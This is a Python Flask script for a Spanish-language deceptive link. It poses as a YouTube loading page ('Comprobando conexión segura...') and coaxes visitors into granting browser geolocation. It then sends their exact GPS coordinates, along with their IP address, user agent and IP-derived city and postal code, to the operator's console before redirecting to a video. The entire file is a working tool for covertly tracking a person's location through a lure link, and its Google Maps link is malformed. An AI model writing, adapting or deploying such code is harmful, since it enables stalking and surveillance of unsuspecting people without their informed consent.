from flask import Flask, request, render_template_string
import geocoder

app = Flask(__name__)

PAGINA_SKIBIDI = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>YouTube...</title>
    <style>
        body { background-color: #111; color: white; font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }
        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 120px; height: 120px; animation: spin 2s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <br>
    <h2>Comprobando conexión segura...</h2>
    <p>Por favor, acepta el permiso de la pantalla para continuar al video.</p>

    <script>
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(enviarDatos, manejarError);
            } else {
                window.location.href = "https://youtu.be/0U3ip3_cLDU?si=S519PUR28_hc6wKo";
            }
        };

        function enviarDatos(posicion) {
            let lat = posicion.coords.latitude;
            let lon = posicion.coords.longitude;
            fetch(`/capturar_gps?lat=${lat}&lon=${lon}`).then(() => {
                window.location.href = "https://youtu.be/0U3ip3_cLDU?si=S519PUR28_hc6wKo";
            });
        }

        function manejarError(error) {
            window.location.href = "https://youtu.be/0U3ip3_cLDU?si=S519PUR28_hc6wKo";
        }
    </script>
</body>
</html>
"""

@app.route('/')
def inicio():
    ip_cliente = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    
    print("\n--- [!]Linkabierto ---")
    print(f"Dirección IP: {ip_cliente}")
    print(f"Dispositivo/Navegador: {user_agent}")
    print("-----------------------------------\n")
    return render_template_string(PAGINA_SKIBIDI)

@app.route('/capturar_gps')
def capturar_gps():
    lat = request.args.get('lat')
    lon = request.args.get('lon')

    ip_completa = request.headers.get('X-Forwarded-For', request.remote_addr)
    ip_limpia = ip_completa.split(',')[0].strip()

    pais = "No encontrado"
    estado = "No encontrado"
    ciudad = "No encontrada"
    codigo_postal = "No encontrado"

    try:
        g_ip = geocoder.ip(ip_limpia)
        if g_ip.ok:
            pais = g_ip.country
            estado = g_ip.state
            ciudad = g_ip.city
            codigo_postal = g_ip.postal
    except Exception as e:
        print(f"Error al decodificar IP: {e}")

    print("----------------------------------------------")
    print("\n--- [🔥] UBICACION ---")
    print(f"Latitud Exacta (GPS): {lat}")
    print(f"Longitud Exacta (GPS): {lon}")
    print(f"Ver en Google Maps: https://google.com{lat},{lon}")
    print("\n-- Datos Generales de la IP --")
    print(f"IP Decodificada: {ip_limpia}")
    print(f"País: {pais}")
    print(f"Estado/Región: {estado}")
    print(f"Ciudad General: {ciudad}")
    print(f"Código Postal de la Central: {codigo_postal}")
    print("----------------------------------------------\n")

    return "OK", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
